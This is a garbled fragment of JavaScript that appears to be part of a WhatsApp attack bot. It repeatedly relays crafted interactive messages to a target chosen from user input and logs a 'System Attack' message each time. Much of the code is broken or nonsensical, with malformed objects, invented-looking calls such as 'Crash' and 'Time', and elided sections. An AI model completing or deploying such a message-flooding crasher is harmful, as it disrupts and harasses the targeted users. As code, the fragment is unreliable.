...
body; proto.Message.InteractiveMessage.Body.fromObject
              splashscreen.Time(200, 107, 142 , 1),
wraperosXjustin(218, 185, 258, 1),
rgba.Time(110, 125, 13) 
clorosXjustin.Crash(5, 10, 2, 1) };
   async function wraperosXjustin (X,show) {
            for (let i = 0; i < 10; i++) {
                    push.push({
     ...
     const sendNext = async () => {
                ...
                if (count < 10) {
                    await wraperosXjustin (X, false); // Menggunakan X dari input pengguna
    ...
    await Ataa.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
            console.log(chalk.green("🩸JustinUi System Attack wraperosXjustin ♻️"));
        }
